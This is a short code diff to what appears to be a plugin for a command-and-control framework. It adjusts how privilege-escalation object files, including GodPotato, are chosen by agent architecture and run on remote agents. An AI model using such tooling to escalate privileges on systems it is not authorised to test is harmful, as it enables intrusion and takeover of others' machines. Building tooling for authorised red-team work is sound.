@@ -22,7 +22,7 @@ def _privkit(agentId, cmdline, args):
     if check == "all":
         # Execute all checks
         for name, path in PRIVESC_CHECKS.items():
-            bof = os.path.join(SCRIPT_DIR, path)
+            bof = os.path.join(SCRIPT_DIR, path.replace("x64", conquest.arch(agentId)))
             if os.path.exists(bof):
                 conquest.execute_alias(agentId, f"privkit {name}", f"bof {bof}")
             else:
@@ -65,7 +65,9 @@ def _godpotato(agentId, cmdline, args):
     cmd = conquest.get_string(args, 0)
     pipe = conquest.get_string(args, 1)
 
-    bof = os.path.join(SCRIPT_DIR, "GodPotato/dist/BOF.x64.o")
+    # GodPotato BOF currently crashes the agent on x86 architecture, which is why it currently only available to x64
+    # TODO: Update GodPotato BOF to support x86
+    bof = os.path.join(SCRIPT_DIR, f"GodPotato/dist/BOF.x64.o")
     params = conquest.bof_pack("zz", [
         cmd if cmd else "token",        # z: Action
         pipe                            # z: Pipe name 
